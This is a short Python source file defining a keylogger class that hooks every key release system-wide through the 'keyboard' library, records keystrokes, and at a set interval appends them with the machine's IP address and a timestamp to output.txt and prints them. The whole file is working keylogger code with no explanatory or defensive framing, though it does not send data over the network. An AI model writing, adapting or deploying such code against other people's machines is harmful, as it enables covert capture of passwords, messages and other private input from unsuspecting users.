import keyboard
import socket
from threading import Semaphore, Timer
from datetime import datetime

class Keylogger:
    def __init__(self, interval):
        self.interval = interval
        self.log = ""
        self.semaphore = Semaphore(0)

    def callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        self.log += name
    
    def getIP(self):
        hostname = socket.gethostname()
        ipAddress = socket.gethostbyname(hostname)
        return ipAddress

    def getDateTime(self):
        now = datetime.now()
        dateTimeString = now.strftime("%d/%m/%Y %H:%M:%S")
        return dateTimeString

    def writeFile(self):
        if self.log:
            f= open("output.txt","a")
            f.write(self.getIP() + "    " + self.getDateTime() + ":" + self.log + "\n")
            f.close()
            print(self.getIP() + "    " + self.getDateTime() + ":" + self.log + "\n")
        self.log = ""
        Timer(interval=self.interval, function=self.writeFile).start()

    def start(self):
        keyboard.on_release(callback=self.callback)
        self.writeFile()
        self.semaphore.acquire()
